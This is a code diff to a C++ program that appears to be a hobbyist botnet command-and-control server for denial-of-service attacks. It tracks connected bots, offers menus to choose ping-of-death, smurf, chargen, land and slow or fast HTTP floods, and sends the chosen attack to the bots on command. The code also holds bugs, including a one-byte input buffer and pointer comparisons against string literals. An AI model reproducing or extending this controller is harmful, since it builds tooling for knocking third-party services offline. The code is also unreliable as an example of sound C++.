@@ -8,12 +8,18 @@
 #include <sys/socket.h>
 #include <unistd.h>
 #include <arpa/inet.h>
+#include <vector>
 
 using namespace std;
 
+bool start = false;
+
+char* attack = "None";
 string target_ip;
+
+vector<string> bots;
 int target_port;
-int server_fd, client_socket, valread;
+int server_fd, valread, client_socket;
 struct sockaddr_in server_address, client_address;
 
 void setup_target_parameters()
@@ -23,6 +29,72 @@ void setup_target_parameters()
 	cout << "\n Enter target port: \n";
 	cin >> target_port;
 }
+
+void start_attack()
+{
+	start = true;
+}
+
+void printASCII(string fileName)
+{
+	string line = "";
+	ifstream inFile;
+	inFile.open(fileName);
+	if (inFile.is_open())
+	{
+		while(getline(inFile, line))
+		{
+			cout << line << endl;
+		}
+	} else {
+		cout << "File failed to load. " << endl;
+		cout << "Nothing to display." << endl;
+	}
+	inFile.close();
+}
+
+
+void menu_header()
+{
+	string fileName = "dos_art.txt";
+	printASCII(fileName);
+}
+
+void list_bots()
+{
+	cout << "Bots connected " << "(" << bots.size() <<"):\n";
+	vector<string>::iterator iter = bots.begin();
+
+	for(iter; iter < bots.end(); iter++) 
+	{
+		cout << "bot: " << *iter << "\n";
+	}
+
+	cout << endl;
+
+	sleep(5);
+}
+
+void threaded(int i)
+{
+	char buffer[1024] = { 0 };	
+	char* hello = "Hello from server";
+	cout << "Client Socket File Descriptor: " << i << "\n";
+
+	valread = read(i, buffer, 1024);
+        cout << "\n" << buffer;
+	while (1)
+	{
+		if (attack != "None" && start == true)
+	       	{
+			cout << "yes";
+			send(i, attack, strlen(attack), 0);
+			cout << "Server attack sent\n";
+			break;
+		}
+	}	
+}
+
 
 void start_server()
 {
@@ -66,22 +138,107 @@ void start_server()
 		perror("accept");
 		exit(EXIT_FAILURE);
 	}
-	
-	cout << "client connected: " << inet_ntoa(client_address.sin_addr);
-	valread = read(client_socket, buffer, 1024);
-	cout << "\n" << buffer;
-	send(client_socket, hello, strlen(hello), 0);
-	cout << "Server Hello message sent\n";
 
-	sleep(10);
+	bots.push_back(inet_ntoa(client_address.sin_addr));
+	
+	cout << "client connected: " << inet_ntoa(client_address.sin_addr) << "\t Total Bots Connected: " << bots.size() << endl;
+
+	sleep(5);
+
+	if (bots.size() == 1)
+	{
+		cout << client_socket;
+		thread t1(threaded, client_socket);
+		t1.detach();
+	}
+	
+	
+	char char_choice[1];
+	int int_choice = 0;
+	do
+	{
+		system("clear");
+		menu_header();
+		cout << "\n";
+		cout << "Server options: \n\n";
+		cout << "1. start attack\n";
+		cout << "2. list connected bots\n";
+		cout << "3. exit\n";
+
+		cin >> char_choice;
+		int_choice = atoi(char_choice);
+
+		
+		switch(int_choice) 
+		{
+			case 1: 
+				start_attack();
+				break;
+			case 2:
+				list_bots();
+				break;
+			case 3:
+				shutdown(server_fd, SHUT_RDWR);
+				break;
+			default:
+				cout << "Wrong choice. Enter option again.";
+				break;
+
+		}
+	} while (int_choice != 3);
 }
 
 void setup_attack_type()
 {
-}
+	char char_choice[1];
+	int int_choice = 0;
+	do
+	{
+		system("clear");
+		menu_header();
+		cout << "\n";
+		cout << "Attack options: \n\n";
+		cout << "1. Ping of death attack\n";
+		cout << "2. Smurf attack\n";
+		cout << "3. Chargen attack\n";
+		cout << "4. Land attack\n";
+		cout << "5. Slow HTTP attack\n";
+		cout << "6. Fast HTTP attack\n";
+		cout << "7. exit\n";
 
-void start_attack()
-{
+		cin >> char_choice;
+		int_choice = atoi(char_choice);
+
+		
+		switch(int_choice) 
+		{
+			case 1: 
+				attack = "POD";
+				break;
+			case 2:
+				attack = "SMURF";
+				break;
+			case 3:
+				attack = "CHARGEN";
+				break;
+			case 4:
+				attack = "LAND";
+				break;
+			case 5:
+				attack = "SLOWHTTP";
+				break;
+			case 6:
+				attack = "FASTHTTP";
+				break;
+			case 7:
+				break;
+			default:
+				cout << "Wrong choice. Enter option again.";
+				break;
+
+		}
+	} while (int_choice != 1 && int_choice != 2 && int_choice != 3 && int_choice != 4 && int_choice != 5 && int_choice != 6 && int_choice != 7);
+
 }
 
 void play_music(string songName)
@@ -89,31 +246,6 @@ void play_music(string songName)
 	string cmd = "canberra-gtk-play -f music/" + songName;
 	system(cmd.c_str());
 }
-
-void printASCII(string fileName)
-{
-	string line = "";
-	ifstream inFile;
-	inFile.open(fileName);
-	if (inFile.is_open())
-	{
-		while(getline(inFile, line))
-		{
-			cout << line << endl;
-		}
-	} else {
-		cout << "File failed to load. " << endl;
-		cout << "Nothing to display." << endl;
-	}
-	inFile.close();
-}
-
-void menu_header()
-{
-	string fileName = "dos_art.txt";
-	printASCII(fileName);
-}
-
 
 void main_menu()
 {
@@ -144,6 +276,8 @@ void main_menu()
 			case 3:
 				start_server();
 				break;
+			case 4:
+				break;
 			default:
 				cout << "Wrong choice. Enter option again.";
 				break;
@@ -154,16 +288,8 @@ void main_menu()
 
 int main()
 {
-	pid_t child_pid = fork();
-	if (child_pid == 0) {
-		system("canberra-gtk-play -f music/music.wav");
-	} else if (child_pid > 0) {
-		main_menu();
-		cout << "Thank you for using dominic's CCC. Have a great day!";
-		string kill_pid = "kill -INT " + child_pid;
-		system(kill_pid.c_str());
-		exit(0);
-	}
-
-	
+	// system("canberra-gtk-play -f music/music.wav");
+	main_menu();
+	cout << "Thank you for using dominic's CCC. Have a great day!";
+	return 0;
 }
